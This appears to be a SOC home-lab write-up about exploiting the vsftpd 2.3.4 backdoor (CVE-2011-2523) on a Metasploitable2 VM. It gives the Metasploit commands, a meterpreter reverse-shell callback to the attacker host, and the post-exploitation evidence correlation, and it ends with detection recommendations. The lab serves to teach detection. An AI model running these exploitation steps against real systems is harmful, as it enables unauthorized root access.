# Project 5 — End-to-End SOC Investigation: VSFTPD 2.3.4 Backdoor Exploitation

![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red)
![Tools](https://img.shields.io/badge/Tools-Kali%20%7C%20Metasploit%20%7C%20Meterpreter%20%7C%20Wireshark%20%7C%20tcpdump-red)

## 🎯 Objective

Chain together a full, realistic attack against a real historical vulnerability — reconnaissance → exploitation → root-level access — using Metasploit against the vsftpd 2.3.4 backdoor identified during Project 2's port scan. Correlate evidence across session, host, and network layers to build one complete incident timeline, rather than treating each layer as a standalone exercise.

---

## 🧠 What is the VSFTPD 2.3.4 Backdoor?

In 2011, the official vsftpd source archive was compromised and a malicious backdoor was inserted into the `vsftpd-2.3.4.tar.gz` release for a short window before it was discovered and removed. Metasploitable2 ships with this exact compromised version.

**How it works:** Sending a username containing a smiley face (`:)`) to the FTP service (port 21) silently triggers the backdoor, which opens a raw root shell listener on port 6200 — no credentials required.

**Why it matters:** This isn't a simulated vulnerability — it's a real, historically significant CVE (CVE-2011-2523) that gives an attacker **root**, not just user-level access, making it a far more severe finding than the reconnaissance (Project 2) or the manually-simulated netcat reverse shell (Project 3/4).

---

## 🖥️ Lab Environment

| Component | Details |
|-----------|---------|
| Attacker | Kali Linux (192.168.248.3) |
| Target | Metasploitable2 (192.168.248.4) |
| Network | Host-Only Adapter (192.168.248.0/24) |
| Exploitation Framework | Metasploit v6.4.135-dev |
| Exploit Module | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Payload | `cmd/linux/http/x86/meterpreter_reverse_tcp` |
| Vulnerable Service | vsftpd 2.3.4 (port 21) |

---

## ⚔️ Attack Chain

### Phase 1: Confirm Target Still Vulnerable
```bash
ping -c 3 192.168.248.4
nmap -sV -p 21 192.168.248.4
```
**Result:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

### Phase 2: Locate and Select the Exploit Module
```
msfconsole
search vsftpd
```
**Result:**
```
1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  Yes  VSFTPD 2.3.4 Backdoor Command Execution
```
Selected based on `Rank: excellent` and exact version match, over the DoS-only `vsftpd_232` module.

```
info 1
use 1
```
Confirmed via `info` that the module is `Privileged: Yes` and `Check supported: Yes`.

### Phase 3: Configure the Module
```
set RHOSTS 192.168.248.4
set LHOST 192.168.248.3
show options
```
| Field | Value | Purpose |
|---|---|---|
| RHOSTS | 192.168.248.4 | Target to exploit |
| RPORT | 21 (default) | Port the backdoor trigger is sent to |
| LHOST | 192.168.248.3 | Attacker IP the payload calls back to |
| LPORT | 4444 (default) | Port on Kali receiving the callback |

### Phase 4: Verify Before Exploiting
```
check
```
**Result:**
```
[+] 192.168.248.4:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
```

### Phase 5: Exploit
```
run
```
**First attempt:** Failed ("Unable to connect to backdoor on 6200/TCP. Cooldown?") — a known flaky characteristic of this module.
**Second attempt:** Failed differently — port 6200 already open from attempt 1, safety check blocked retry.
**Third attempt (forced):**
```
set ForceExploit true
run
```
**Result:**
```
[+] 192.168.248.4:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.248.3:4444 -> 192.168.248.4:40023) at 2026-07-28 21:35:29 -0400
meterpreter >
```

---

## 🔍 Post-Exploitation Evidence Collection

### 1. Confirm privilege level
```
getuid
```
**Result:** `root` — a significant escalation compared to Project 3/4's netcat reverse shell (`msfadmin`, user-level).

### 2. Confirm target identity and OS
```
sysinfo
```
**Result:**
```
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
```

### 3. Network visibility from inside the target
```
ipconfig
```
**Notable finding:** A second network interface (`eth1`) exists with no IP shown on the known segment — a possible lateral movement opportunity.

### 4. Running processes
```
ps
```
Confirmed `sshd`, `apache2`, `snmpd`, and `unrealircd` (a second known-backdoored service, CVE-2010-2075) all live. Most significant: a process named `mvJBVNMpG`, running as root from a non-standard path — the meterpreter payload itself.

### 5. Network connection evidence
```
netstat -antp
```
**Key lines:**
```
tcp  192.168.248.4:40023  192.168.248.3:4444   ESTABLISHED   ← Active meterpreter session
tcp  192.168.248.4:6200   192.168.248.3:37088  ESTABLISHED   ← Original backdoor shell
tcp  192.168.248.4:6200   192.168.248.3:46773  CLOSE_WAIT    ← Leftover manual netcat attempt
```

---

## 🚩 Three-Layer Evidence Correlation

| Layer | Evidence | What It Proves |
|---|---|---|
| **Session** | `getuid` → `root` | Successful privilege escalation |
| **Host** | `ps` → unrecognized root process `mvJBVNMpG` | The payload artifact is visible on the compromised system |
| **Network** | `netstat` → established connections on ports 6200 and 4444 | The literal communication channels backing the compromise |

---

## 🧠 Key Concepts Learned

**Real Exploits vs. Simulated Access** — This project used a genuine historical CVE and Metasploit's actual framework, including realistic flakiness (the "cooldown" failures) not seen in a clean tutorial.

**Exploit vs. Payload** — The exploit is what breaks in; the payload is what you get once you're in.

**Privilege Escalation Matters** — Root access is categorically more severe than user-level access.

**Process Lists as Detection Evidence** — Payloads leave artifacts on the host, not just in network traffic.

---

## ⚠️ Issues Faced & Fixed

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| `set payload cmd/unix/interact` rejected | Payload name doesn't exist for this module | Used `show payloads` to list actual compatible payloads |
| First `run` failed — "Cooldown?" | Known flaky backdoor behavior | Retried |
| Second `run` failed — port 6200 in use | First attempt actually succeeded but nothing consumed the shell | Used `set ForceExploit true` |
| Manual `nc` to port 6200 appeared to hang | Metasploit's automated flow consumed the shell first | Not a real issue — meterpreter succeeded via the automated path |

---

## 📈 Detection Quality Assessment

| Metric | Value |
|--------|-------|
| Privilege Achieved | root |
| Session Type | Meterpreter |
| Evidence Layers Correlated | 3 (session, host, network) |
| Anomalous Process Identified | Yes (`mvJBVNMpG`) |
| Detection Method | Manual post-exploitation review |

---

## 🔧 Recommended Improvements

- Patch/remove vsftpd 2.3.4 immediately
- Host-based monitoring (auditd/EDR) for new root processes from non-standard paths
- Network-layer detection for connections to port 6200
- Egress filtering to block unsolicited outbound connections
- Forward auditd/Zeek telemetry into Splunk

---

## 📝 Notes

Quick definitions of new terms/concepts encountered in this project:

- **Metasploit** — A penetration testing framework: a large library of known exploits, payloads, and post-exploitation tools accessed through one console (`msfconsole`).
- **msfconsole** — Metasploit's interactive command-line interface, where you search, select, configure, and run modules.
- **Exploit (module)** — Code that triggers a specific vulnerability to gain unauthorized access to a system.
- **Payload** — The code that runs *after* an exploit succeeds — decides what you actually get to do (e.g., a basic shell vs. a full agent).
- **Meterpreter** — Metasploit's advanced post-exploitation agent, offering more capability than a raw shell (file transfer, process info, network enumeration, etc.), delivered as a payload.
- **RHOSTS / LHOST** — RHOSTS is the target's IP (Remote Host); LHOST is the attacker's IP (Listen Host) that a payload calls back to.
- **`check` (Metasploit command)** — Tests whether a target is vulnerable without actually running the exploit, when the module supports it.
- **Privileged access (root vs. user)** — Root access grants full read/write/execute control of a system; user-level access is constrained to that account's permissions only — a fundamentally different severity of compromise.
- **CVE** — Common Vulnerabilities and Exposures: a standardized ID (e.g., CVE-2011-2523) assigned to a publicly known security flaw so it can be referenced consistently across tools and reports.

---

---

*Lab conducted as part of SOC Home Lab training — simulated environment only*
*Analyst: Sreelakshmi Chandran | github.com/Leee-bit*
